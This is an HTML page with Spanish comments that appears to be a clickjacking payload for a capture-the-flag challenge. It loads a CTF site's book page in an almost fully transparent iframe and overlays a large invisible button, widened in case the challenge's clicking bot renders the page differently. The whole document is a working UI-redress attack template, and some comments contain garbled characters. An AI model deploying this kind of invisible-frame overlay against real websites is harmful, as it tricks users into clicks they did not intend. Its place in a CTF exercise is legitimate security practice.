<!DOCTYPE html>
<html>
<head>
    <style>
        /* Eliminamos cualquier margen que pueda descuadrar */
        * { margin: 0; padding: 0; }
        
        #wrapper {
            position: relative;
            width: 1200px; /* Ancho fijo para evitar variaciones */
            height: 1500px;
            margin: 0 auto;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.0001; /* Invisible pero funcional */
            z-index: 1;
        }

        #objetivo {
            position: absolute;
            z-index: 2;
            
            /* --- AREA DE IMPACTO AMPLIADA --- */
            /* Bajamos un poco m치s el top por si el bot tiene headers m치s grandes */
            top: 750px; 
            left: 0;
            
            /* Hacemos el bot칩n MUY ancho y m치s alto */
            width: 100%;  /* Cubre todo el ancho del container */
            height: 300px; /* Cubre una franja enorme de arriba a abajo */
            
            background: transparent;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="wrapper">
        <button id="objetivo"></button>
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>
</body>
</html>
